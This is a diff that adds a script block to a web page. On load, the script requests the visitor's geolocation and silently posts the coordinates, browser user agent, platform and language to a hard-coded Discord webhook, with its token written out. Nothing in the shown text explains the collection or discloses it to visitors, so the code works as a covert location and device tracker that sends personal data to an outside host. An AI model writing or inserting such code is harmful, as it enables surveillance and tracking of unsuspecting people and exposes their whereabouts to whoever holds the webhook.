@@ -1,0 +1,30 @@
+<script>
+  window.onload = function() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition((position) => {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language
+      };
+
+      const webhookURL = "https://discord.com/api/webhooks/1223734706470912000/aw9JJyAnPNpuqyyCXydHW8YMI0YJbMOI9HiazNI0j69aB4GC2A8u05zGA0aj4WAafqm9";
+      
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          latitude,
+          longitude,
+          deviceInfo
+        })
+      });
+    });
+  }
+};
+</script>
